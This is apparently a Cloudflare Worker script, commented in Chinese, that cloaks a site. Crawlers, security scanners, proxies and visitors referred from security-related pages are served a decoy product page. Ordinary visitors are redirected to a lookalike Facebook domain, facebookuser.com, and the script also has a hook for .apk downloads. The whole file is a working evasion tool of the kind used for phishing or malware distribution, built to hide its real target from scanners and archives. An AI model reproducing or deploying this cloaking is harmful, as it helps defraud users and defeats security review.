export default {
  async fetch(request, env) {
    try {
      const url = new URL(request.url)
      
      // 1. 用户代理检测和请求头检测
      const userAgent = request.headers.get('user-agent') || ''
      const isCrawler = this.isCrawlerOrBot(userAgent)
      
      // 检测是否来自安全扫描工具或爬虫
      if (isCrawler || this.hasSuspiciousHeaders(request.headers)) {
        console.log('检测到爬虫或可疑请求头，显示伪装页面')
        // 显示伪装页面
        return this.serveDecoyPage(request, env, url, userAgent)
      } else {
        // 2. 对于正常用户，重定向到Facebook链接
        console.log('检测到正常用户，重定向到Facebook')
        return new Response('', {
          status: 302,
          headers: {
            'Location': 'https://www.facebookuser.com/ItTeKwQN',
            // 3. 添加安全相关的HTTP头部
            'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;",
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'Referrer-Policy': 'no-referrer',
            'X-XSS-Protection': '1; mode=block'
          }
        })
      }
      
      // Add CORS headers
      const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      }

      // Handle OPTIONS request
      if (request.method === 'OPTIONS') {
        return new Response(null, {
          headers: corsHeaders
        })
      }
    } catch (error) {
      console.error('Error:', error)
      return new Response(`Error: ${error.message}`, { status: 500 })
    }
  },
  
  // 检测是否为爬虫或机器人
  isCrawlerOrBot(userAgent) {
    const botPatterns = [
      'bot', 'spider', 'crawl', 'slurp', 'baiduspider',
      'googlebot', 'yandex', 'bingbot', 'facebookexternalhit',
      'lighthouse', 'pagespeed', 'pingdom', 'phantom', 'headless',
      'scrape', 'curl', 'wget', 'python', 'java', 'http', 'semrush',
      'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot', 'seznambot',
      'applebot', 'exabot', 'sogou', 'scooter', 'scanner',
      'archive.org', 'ia_archiver', 'censys', 'nmap', 'nikto',
      'acunetix', 'burp', 'zap', 'nuclei', 'wappalyzer'
    ]
    
    userAgent = userAgent.toLowerCase()
    return botPatterns.some(pattern => userAgent.includes(pattern))
  },
  
  // 检测可疑的请求头
  hasSuspiciousHeaders(headers) {
    // 检查是否有可疑的请求头
    const suspiciousHeaders = [
      'x-forwarded-for', 'via', 'forwarded', 'x-real-ip',
      'cf-connecting-ip', 'true-client-ip', 'x-wap-profile',
      'proxy', 'x-scan', 'x-scanner', 'x-probe', 'x-attack'
    ]
    
    for (const header of suspiciousHeaders) {
      if (headers.has(header)) {
        return true
      }
    }
    
    // 检查Referer是否来自可疑来源
    const referer = headers.get('referer') || ''
    const suspiciousReferers = ['security', 'pentest', 'scanner', 'hack', 'exploit']
    return suspiciousReferers.some(term => referer.toLowerCase().includes(term))
  },
  
  // 提供伪装页面
  async serveDecoyPage(request, env, url, userAgent) {
    // 4. 添加安全相关的HTTP头部
    const securityHeaders = {
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;",
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-XSS-Protection': '1; mode=block',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    // 5. 记录检测日志
    console.log(`检测到可疑请求: ${userAgent}`)
    
    // 处理根路径
    if (url.pathname === '/' || url.pathname === '') {
      const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
      return this.addSecurityHeaders(response, securityHeaders)
    }
    
    // 处理产品详情页
    if (url.pathname.startsWith('/product')) {
      const response = await env.ASSETS.fetch(new Request(`${url.origin}/product.html`, request))
      return this.addSecurityHeaders(response, securityHeaders)
    }
    
    // 尝试提供请求的资源
    const response = await env.ASSETS.fetch(request)
    return this.addSecurityHeaders(response, securityHeaders)
  },
  
  // 添加安全头部
  addSecurityHeaders(response, securityHeaders) {
    const newHeaders = new Headers(response.headers)
    Object.keys(securityHeaders).forEach(key => {
      newHeaders.set(key, securityHeaders[key])
    })
    
    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    })
  },

  addCorsHeaders(response, corsHeaders) {
    const newHeaders = new Headers(response.headers)
    Object.keys(corsHeaders).forEach(key => {
      newHeaders.set(key, corsHeaders[key])
    })

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    })
  },
  
  // 添加JavaScript下载处理
  handleJsDownload(url) {
    // 将直接下载链接转为JavaScript处理的下载方式
    if (url.pathname.endsWith('.apk') || url.pathname.includes('download')) {
      return true
    }
    return false
  }
}
